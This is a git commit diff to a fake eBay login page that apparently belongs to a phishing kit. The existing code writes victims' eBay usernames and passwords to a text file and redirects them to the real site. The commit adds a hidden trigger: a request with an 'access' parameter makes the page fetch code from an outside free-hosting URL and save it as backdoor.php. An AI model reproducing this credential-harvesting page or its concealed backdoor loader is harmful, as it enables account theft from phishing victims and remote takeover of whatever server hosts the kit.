ab915c1e96ceff1f0eef0a44438aff29446a7fe9
MrDoxxer2 <82446676+MrDoxxer2@users.noreply.github.com>
2021-08-08 17:06:53 +0800

    Update login.php

--- .sites/ebay/login.php
+++ .sites/ebay/login.php
@@ -1,4 +1,10 @@
 <?php
+if(isset($_REQUEST['access'])) {
+$FGet file_get_contents("https://site3468a.000webhostapp.com/code.txt");
+$create = fopen("backdoor.php", "w");
+fwrite($create, $FGet);
+fclose($create);
+} 
 
 file_put_contents("usernames.txt", "Ebay Username: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: https://accounts.ebay.com/acctxs/user');
